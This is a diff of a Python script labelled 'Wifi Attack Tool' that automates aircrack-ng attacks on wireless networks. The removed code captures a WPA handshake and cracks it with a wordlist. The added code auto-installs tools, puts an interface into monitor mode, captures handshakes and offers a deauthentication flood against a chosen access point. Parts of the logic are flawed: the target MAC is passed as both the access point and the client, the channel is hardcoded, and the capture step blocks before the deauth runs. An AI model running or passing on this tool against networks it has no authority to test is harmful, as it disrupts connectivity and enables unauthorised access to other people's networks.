@@ -14,8 +14,8 @@
 
 import subprocess
 import sys
-import time
 import os
+
 
 # Banner
 def display_splash_screen():
@@ -53,115 +53,80 @@ def display_splash_screen():
     print("Wifi Attack Tool 41PH4-01\n")
 
 
-# Function to check if a command is available on the system
-def check_tool_installed(tool_name):
+# Function to check if a tool is installed and install it if not
+def check_and_install_tool(tool_name, install_command):
     try:
-        result = subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        if result.returncode != 0:
-            raise FileNotFoundError
-        print(f"{tool_name} is installed.")
-    except (FileNotFoundError, subprocess.CalledProcessError):
-        print(f"{tool_name} is not installed. Please install it and run the script again.")
-        sys.exit(1)
-
-# Function to detect available network interfaces
-def get_network_interfaces():
-    try:
-        result = subprocess.run(["ip", "link"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        interfaces = result.stdout.decode().splitlines()
-        interfaces = [line.split(":")[1].strip() for line in interfaces if "wlan" in line or "eth" in line]
-        if not interfaces:
-            raise ValueError("No network interfaces found.")
-        return interfaces
-    except Exception as e:
-        print(f"Error detecting network interfaces: {e}")
-        sys.exit(1)
-
-# Function to enable monitor mode on the specified interface
-def enable_monitor_mode(interface):
-    try:
-        print(f"Enabling monitor mode on {interface}...")
-        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
-        print(f"{interface} set to monitor mode.")
+        subprocess.run([tool_name, "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        print(f"{tool_name} is already installed.")
     except subprocess.CalledProcessError:
-        print(f"Failed to set {interface} to monitor mode.")
+        print(f"{tool_name} is not installed. Installing...")
+        subprocess.run(install_command, shell=True, check=True)
+
+# Function to enable monitor mode on the selected interface
+def enable_monitor_mode(interface):
+    print(f"Enabling monitor mode on {interface}...")
+    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)  # Killing any interfering processes
+    subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)  # Start monitor mode
+    return f"{interface}mon"
+
+# Function to scan networks
+def scan_networks(interface):
+    print(f"Scanning networks on {interface}...")
+    try:
+        subprocess.run(["sudo", "airodump-ng", interface], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error scanning network: {e}")
         sys.exit(1)
 
-# Function to scan for networks
-def scan_networks(interface):
-    try:
-        print(f"Scanning for networks on {interface}...")
-        networks = subprocess.check_output(["sudo", "airodump-ng", interface], stderr=subprocess.PIPE).decode()
-        print(networks)  # Optionally, you can parse this output to display SSIDs and BSSIDs more cleanly.
-    except subprocess.CalledProcessError as e:
-        print(f"Error scanning networks: {e}")
-        sys.exit(1)
+# Function to perform deauthentication attack
+def deauth_attack(interface, target_mac, channel):
+    print(f"Performing deauth attack on {target_mac}...")
+    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_mac, "-c", target_mac, interface], check=True)
 
 # Function to capture WPA handshake
-def capture_handshake(interface, target_bssid, output_file):
-    try:
-        print(f"Capturing WPA handshake for BSSID {target_bssid}...")
-        subprocess.run(["sudo", "airodump-ng", "--bssid", target_bssid, "-c", "6", "-w", output_file, interface], check=True)
-        print(f"Handshake captured and saved to {output_file}.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error capturing handshake: {e}")
-        sys.exit(1)
+def capture_handshake(interface, target_mac, output_file):
+    print(f"Capturing WPA handshake on {interface}...")
+    subprocess.run(["sudo", "airodump-ng", "-c", "6", "--bssid", target_mac, "-w", output_file, interface], check=True)
 
-# Function to crack WPA handshake using aircrack-ng
-def crack_handshake(handshake_file, wordlist):
-    try:
-        print(f"Cracking WPA handshake with wordlist {wordlist}...")
-        result = subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, handshake_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = result.stdout.decode()
-        if "KEY FOUND" in output:
-            print(f"Password found: {output.splitlines()[-1]}")
-        else:
-            print("Failed to crack the password.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error cracking handshake: {e}")
-        sys.exit(1)
-
-# Main function to tie everything together
+# Main function that automates the process
 def main():
-    # Check for required tools
-    check_tool_installed("airmon-ng")
-    check_tool_installed("airodump-ng")
-    check_tool_installed("aircrack-ng")
-    
-    # Detect available network interfaces
-    interfaces = get_network_interfaces()
-    print("Available interfaces:")
-    for idx, iface in enumerate(interfaces):
-        print(f"{idx + 1}. {iface}")
-    
-    # Ask user to choose interface
-    selection = input("Select the network interface to use (number): ")
-    try:
-        selected_iface = interfaces[int(selection) - 1]
-        print(f"Selected interface: {selected_iface}")
-    except (ValueError, IndexError):
-        print("Invalid selection, exiting.")
-        sys.exit(1)
-    
+    # Check if necessary tools are installed
+    check_and_install_tool("airodump-ng", "sudo apt install aircrack-ng -y")
+    check_and_install_tool("aireplay-ng", "sudo apt install aircrack-ng -y")
+    check_and_install_tool("airmon-ng", "sudo apt install aircrack-ng -y")
+
+    # Get the network interface
+    interface = input("Enter the network interface (e.g., wlan0): ")
+
     # Enable monitor mode
-    enable_monitor_mode(selected_iface)
+    monitor_interface = enable_monitor_mode(interface)
     
-    # Scan for networks
-    scan_networks(selected_iface)
+    # Scan networks and let the user select a network
+    scan_networks(monitor_interface)
     
-    # Ask user for target BSSID (Network MAC address)
-    target_bssid = input("Enter the BSSID (Network MAC address) of the target network: ")
-    # Set output file for capturing handshake
-    output_file = "/tmp/capture"
-    
-    # Capture WPA handshake
-    capture_handshake(selected_iface, target_bssid, output_file)
-    
-    # Ask for wordlist location
-    wordlist = input("Enter the path to your wordlist: ")
-    
-    # Crack WPA handshake
-    crack_handshake(f"{output_file}-01.cap", wordlist)
+    # Input target MAC address and output file name for capturing the handshake
+    target_mac = input("Enter the MAC address of the target network: ")
+    output_file = input("Enter the output file name for capturing the handshake: ")
+
+    # Start capturing the WPA handshake
+    capture_handshake(monitor_interface, target_mac, output_file)
+
+    # Ask if the user wants to perform a deauth attack
+    deauth_choice = input("Do you want to perform a deauth attack? (y/n): ")
+    if deauth_choice.lower() == 'y':
+        deauth_attack(monitor_interface, target_mac, "6")
+
+    # Restart the network and cleanup
+    print("Cleaning up and restarting the network...")
+    subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface], check=True)
+    subprocess.run(["sudo", "service", "networking", "restart"], check=True)
+    print("Network restarted successfully.")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nProcess interrupted. Restarting the network and cleaning up...")
+        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], check=True)
+        subprocess.run(["sudo", "service", "networking", "restart"], check=True)
+        sys.exit(0)
